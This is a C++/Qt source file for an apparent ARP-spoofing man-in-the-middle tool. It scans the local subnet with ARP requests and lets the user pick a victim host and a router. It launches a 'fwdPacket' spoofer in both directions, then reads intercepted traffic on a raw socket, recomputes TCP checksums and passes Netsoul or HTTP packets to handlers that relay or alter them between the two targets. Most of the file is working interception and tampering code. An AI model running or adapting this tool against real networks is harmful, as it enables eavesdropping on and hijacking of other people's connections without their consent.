#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QtGui/QMessageBox>
#include <QtNetwork/QNetworkInterface>
#include "arprequest.h"
#include <iostream>
#include <QtGui/QTableWidgetItem>
#include <QtGui/QStandardItemModel>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include "rawsocket.h"
#include "netsoul.h"
#include <unistd.h>
#include "rsock.h"
#include "http.h"
#include "IProtocol.hpp"

MainWindow::MainWindow(QWidget *parent) :
        QMainWindow(parent),
        ui(new Ui::MainWindow),
        nbItem(0),
        currentProtocol(NULL),
        state(0)
{
    ui->setupUi(this);

    foreach(QNetworkInterface iter, QNetworkInterface::allInterfaces())
        if(iter.isValid())
            if (!iter.hardwareAddress().isEmpty())
            {
        ui->cbInt->addItem(iter.humanReadableName());
        if (iter.humanReadableName() == "eth0")
            ui->cbInt->setEditText("eth0");
    }
    int idx = ui->cbInt->findText("eth0");
    if (idx != -1)
    {
        ui->cbInt->setCurrentIndex(idx);
        fillIps("eth0");
    }

    this->ui->twMain->setColumnWidth(0, 200);
    this->ui->twMain->setColumnWidth(1, 250);
    this->ui->twMain->setSelectionBehavior(QAbstractItemView::SelectRows);
    this->ui->twMain->setSelectionMode(QAbstractItemView::SingleSelection);
    this->statusText = new QLabel(this);
    this->statusText->setText("No scan running");
    this->ui->sbMain->addPermanentWidget(this->statusText, 200);
    this->ui->sbMain->show();


    // FOR UI DEBUG
    //uint8_t dst_hwaddr[6];
    //memset(dst_hwaddr, 0xff, 6);
    //this->addNewItem("Test ", dst_hwaddr);


    QObject::connect(ui->cbInt, SIGNAL(currentIndexChanged(QString)), this, SLOT(fillIps(QString)));
    QObject::connect(ui->btnScan, SIGNAL(clicked()), this, SLOT(scan()) );
    QObject::connect(ui->pbSetDest, SIGNAL(clicked()), this, SLOT(setDest()));
    QObject::connect(ui->pbSetSource, SIGNAL(clicked()), this, SLOT(setSource()));
    QObject::connect(ui->pbPlay, SIGNAL(clicked()), this, SLOT(play()));
    QObject::connect(this, SIGNAL(destroyed()), this, SLOT(close()));
}

MainWindow::~MainWindow()
{
    delete ui;
    system("pkill fwdPacket");
}



void MainWindow::fillIps(QString interface)
{
    ui->cbIp->clear();
    foreach (QHostAddress h, QNetworkInterface::interfaceFromName(interface).allAddresses())
        if (h.protocol() == QAbstractSocket::IPv4Protocol && h.toString() != "127.0.0.1")
            ui->cbIp->addItem(h.toString());
}

void MainWindow::setDest()
{
    if (this->ui->twMain->selectedItems().count() == 0 || this->ui->twMain->selectedItems().count() > 1)
        QMessageBox::information(this, "Error", "You must select 1 item");
    else
    {
        this->ui->leRouterIP->setText(this->ui->twMain->item(this->ui->twMain->selectedItems().first()->row(), 0)->text());
        this->ui->leRouterMAC->setText(this->ui->twMain->item(this->ui->twMain->selectedItems().first()->row(), 1)->text());
    }
}

void MainWindow::setSource()
{
    if (this->ui->twMain->selectedItems().count() == 0 || this->ui->twMain->selectedItems().count() > 1)
        QMessageBox::information(this, "Error", "You must select 1 item");
    else
    {
        this->ui->leSourceIP->setText(this->ui->twMain->item(this->ui->twMain->selectedItems().first()->row(), 0)->text());
        this->ui->leSourceMAC->setText(this->ui->twMain->item(this->ui->twMain->selectedItems().first()->row(), 1)->text());
    }
}

void MainWindow::newPacket(RAWSocket & s, Packet & p, bool isFromTarget, uint8_t* dstMac)
{
    bool isCurrentProtocol = false;
    eth* pETH = static_cast<eth*>(p.getBuffer());
    ip*  pIP = static_cast<ip*>(p.getBuffer());
    tcp* pTCP = static_cast<tcp*>(p.getBuffer());

    std::cout << "============== New Packet ==============" << std::endl;
    dynamic_cast<Netsoul *>(this->currentProtocol)->addActivity("============== New Packet ==============");
    if (pIP->isTCP() && p.Size >= sizeof(tcp))
    {
        dynamic_cast<Netsoul *>(this->currentProtocol)->addActivity(QString("OLD " + QString::number(pTCP->check)).toStdString().c_str());
        p.computeChecksum();
        dynamic_cast<Netsoul *>(this->currentProtocol)->addActivity(QString("NEW " + QString::number(pTCP->check)).toStdString().c_str());
        dynamic_cast<Netsoul *>(this->currentProtocol)->addActivity("-----------");

        // Detect protocol
        if (this->ui->cbProtocol->currentText() == "Netsoul")
            isCurrentProtocol = dynamic_cast<Netsoul *>(this->currentProtocol)->isProtocol(p);
        if (isCurrentProtocol)
            std::cout << "\t******* " << this->ui->cbProtocol->currentText().toStdString() << " *******" << std::endl;
        // Process packet
        if (this->ui->cbProtocol->currentText() == "Netsoul" && isCurrentProtocol)
        {

            if (isFromTarget)
                dynamic_cast<Netsoul *>(this->currentProtocol)->sendTargetAToTargetB(p);
            else
                dynamic_cast<Netsoul *>(this->currentProtocol)->sendTargetBToTargetA(p);
        }
    }
    else
        std::cout << "from client not tcp" << std::endl;
    memcpy(pETH->ar_sha, pETH->ar_tha, 6);
    if (isFromTarget)
        memcpy(pETH->ar_tha, dstMac, 6);
    else
        memcpy(pETH->ar_tha, dstMac, 6);
    s.Write(p);
    std::cout << "============== End of New Packet ==============" << std::endl << std::endl;
}


void MainWindow::play()
{
    if (this->state & Playing)
    {
        delete this->currentProtocol;
        this->currentProtocol = NULL;
        this->ui->pbPlay->setText("Play");
        system("pkill fwdPacket");
        this->statusText->setText("Spoofing stopped");
        this->state -= Spoofing;
        this->state -= Playing;
    }
    else if (this->currentProtocol == NULL)
    {
        startSpoofing();
        this->state |= Playing;
        this->ui->pbPlay->setText("Stop");
        if (this->ui->cbProtocol->currentText() == "Netsoul")
            this->currentProtocol = new Netsoul(this->ui->centralWidget);
        else if (this->ui->cbProtocol->currentText() == "Http")
            this->currentProtocol = new http(this->ui->centralWidget);
        this->currentProtocol->show();
        RAWSocket s;
        s.Create(this->currentHWIndex, ETH_P_IP);

        uint32_t ipA, ipB, myip;
        QHostAddress tmp;
        tmp.setAddress(this->ui->leSourceIP->text());
        ipA = htonl(tmp.toIPv4Address());
        tmp.setAddress(this->ui->leRouterIP->text());
        ipB = htonl(tmp.toIPv4Address());
        tmp.setAddress(this->ui->cbIp->currentText());
        myip = htonl(tmp.toIPv4Address());

        uint8_t macA[6], macB[6];

        mactoa((char*)this->ui->leSourceMAC->text().toStdString().c_str(), macA);
        mactoa((char*)this->ui->leRouterMAC->text().toStdString().c_str(), macB);

        //Packet test;
        //test.append(new tcp, sizeof(tcp));

        //tcp* testTCP = (tcp*)test.getBuffer();
        //testTCP->craftTCP(macA, ipA, macB, ipB);
        //test.append("jesusjesusjesusjesus", 20);
        //s.Write(test);
        //this->state -= Playing;


        while (this->state & Playing)
        {
            // poll each ms
            if (s.Poll(1000))
            {
                Packet p;
                s.Read(p, true);

                ip*  pIP = static_cast<ip*>(p.getBuffer());
                tcp* pTCP = static_cast<tcp*>(p.getBuffer());

                // AFFICHAGE DEBUG
                if ((pIP->ip_src == ipA && pIP->ip_dst != myip) || (pIP->ip_dst == ipA))
                {
                    /*
                    uint32_t ips = pIP->ip_src;
                    printf("- Src %d.%d.%d.%d ", ((ips >> 0) & 0xff), ((ips >> 8) & 0xff), ((ips >> 16) & 0xff), ((ips >> 24) & 0xff)); ips = pIP->ip_dst;
                    printf("- Dst %d.%d.%d.%d ", ((ips >> 0) & 0xff), ((ips >> 8) & 0xff), ((ips >> 16) & 0xff), ((ips >> 24) & 0xff)); ips = ipA;
                    printf("- ipA %d.%d.%d.%d ", ((ips >> 0) & 0xff), ((ips >> 8) & 0xff), ((ips >> 16) & 0xff), ((ips >> 24) & 0xff)); ips = ipB;
                    printf("- ipB %d.%d.%d.%d -\n", ((ips >> 0) & 0xff), ((ips >> 8) & 0xff), ((ips >> 16) & 0xff), ((ips >> 24) & 0xff));
                    */
                    //if (pIP->isTCP() && p.Size >= sizeof(tcp))
                    //    std::cout << "ACK = " << pTCP->ack << "\n PORT : src " << htons(pTCP->source) << " dst " << htons(pTCP->dest)
                    //    << "seq : " << pTCP->seq << "ack : " << pTCP->ack_seq << std::endl;
                }
                // ! FIN AFFICHAGE !

                if (pIP->ip_src == ipA && pIP->ip_dst != myip) // from "client" to "router"
                    this->newPacket(s, p, true, macB);
                else if (pIP->ip_dst == ipA) // from "router" to "client"
                    this->newPacket(s, p, false, macA);
            }
            QCoreApplication::processEvents();
            QCoreApplication::sendPostedEvents(NULL, 0);
            usleep(10); // sleep 1ms
        }
        if (this->state & Playing)
        {
            this->statusText->setText("Playing done");
            this->state -= Playing;
        }
        else
            this->statusText->setText("Playing aborted");
        this->ui->pbPlay->setText("Play");
    }

}




void MainWindow::scan()
{
    if (this->state & Scanning)
    {
        this->ui->btnScan->setText("Scan");
        this->state -= Scanning;
    }
    else
    {
        this->ui->btnScan->setText("Stop scan");
        this->statusText->setText("Start scanning ...");
        this->state |= Scanning;
        RAWSocket s;
        this->ui->twMain->clearContents();
        this->ui->twMain->setRowCount(0);
        this->nbItem = 0;
        ARPRequest arpr;
        if (ui->cbIp->count() != 0)
        {
            // get interface ip and mask
            QNetworkInterface currentInterface = QNetworkInterface::interfaceFromName(ui->cbInt->currentText());
            QNetworkAddressEntry currentIP;
            foreach (QNetworkAddressEntry addr, currentInterface.addressEntries())
                if (addr.ip().toString() == ui->cbIp->currentText())
                    currentIP = addr;
            this->currentHWIndex = currentInterface.index();
            s.Create(currentInterface.index(), (uint16_t)ETH_P_ALL);
            unsigned int ip = currentIP.ip().toIPv4Address() & currentIP.netmask().toIPv4Address();
            unsigned int netmask = currentIP.netmask().toIPv4Address();
            QNetworkAddressEntry current;
            uint32_t i = 0;
            while ((++i & ~netmask) && (~i & ~netmask) && this->state & Scanning)
            {
                ip++;
                current.setIp(QHostAddress(ip));
                this->statusText->setText("Scan is running - " + current.ip().toString());
                uint8_t * rep = arpr.doRequest(s, currentInterface, htonl(currentIP.ip().toIPv4Address()), htonl(ip), this->ui->sbTimeout->value());
                if (rep != NULL)
                    this->addNewItem(current.ip().toString(), rep);

                QCoreApplication::processEvents();
            }
            if (this->state & Scanning)
            {
                this->statusText->setText("Scan done");
                this->state -= Scanning;
            }
            else
                this->statusText->setText("Scan aborted");
            this->ui->btnScan->setText("Scan");
        }
    }
}

void	MainWindow::addNewItem(QString const & ip, uint8_t * mac)
{
    this->ui->twMain->setRowCount(this->nbItem + 1);
    QTableWidgetItem* i = new QTableWidgetItem(QStandardItem::UserType);
    i->setText(ip);
    i->setFlags(Qt::ItemIsEditable);
    this->ui->twMain->setItem(this->nbItem, 0, i);

    i = new QTableWidgetItem(QStandardItem::UserType);
    QString macAddr;
    macAddr += QString::number(mac[0], 16) + ":" + QString::number(mac[1], 16) + ":" + QString::number(mac[2], 16) + ":" +
               QString::number(mac[3], 16) + ":" +  QString::number(mac[4], 16) + ":" +  QString::number(mac[5], 16);
    i->setText(macAddr);
    i->setToolTip(macAddr);
    this->ui->twMain->setItem(this->nbItem, 1, i);
    this->nbItem++;
}

void MainWindow::startSpoofing()
{
    this->state |= Spoofing;
    this->statusText->setText("Spoofing ...");
    if (!fork())
        execl("./fwdPacket", "./fwdPacket",
              ui->cbInt->currentText().toStdString().c_str(),
              this->ui->leSourceIP->text().toStdString().c_str(),
              this->ui->leSourceMAC->text().toStdString().c_str(),
              this->ui->leRouterIP->text().toStdString().c_str(),
              this->ui->leRouterMAC->text().toStdString().c_str(),
              (char*)NULL);

    if (!fork())
        execl("./fwdPacket", "./fwdPacket",
              ui->cbInt->currentText().toStdString().c_str(),
              this->ui->leRouterIP->text().toStdString().c_str(),
              this->ui->leRouterMAC->text().toStdString().c_str(),
              this->ui->leSourceIP->text().toStdString().c_str(),
              this->ui->leSourceMAC->text().toStdString().c_str(),
              (char*)NULL);
}
